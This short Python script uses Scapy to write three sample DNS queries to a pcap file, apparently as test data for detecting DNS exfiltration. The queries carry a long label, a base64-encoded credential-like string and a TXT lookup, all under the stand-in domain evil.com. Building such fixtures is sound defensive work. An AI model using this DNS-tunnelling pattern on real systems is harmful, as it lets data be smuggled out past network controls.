from scapy.all import DNS, DNSQR, IP, UDP, wrpcap

packets = []

# Long domain
pkt1 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="a"*60 + ".evil.com"))
# Base64-ish domain
pkt2 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="QWxhZGRpbjpvcGVuIHNlc2FtZQ==.evil.com"))
# TXT record
pkt3 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="exfil.evil.com", qtype=16))

packets.extend([pkt1, pkt2, pkt3])
wrpcap("examples/fake_suspicious_dns.pcap", packets)
print("[+] Fake suspicious PCAP created at examples/fake_suspicious_dns.pcap")
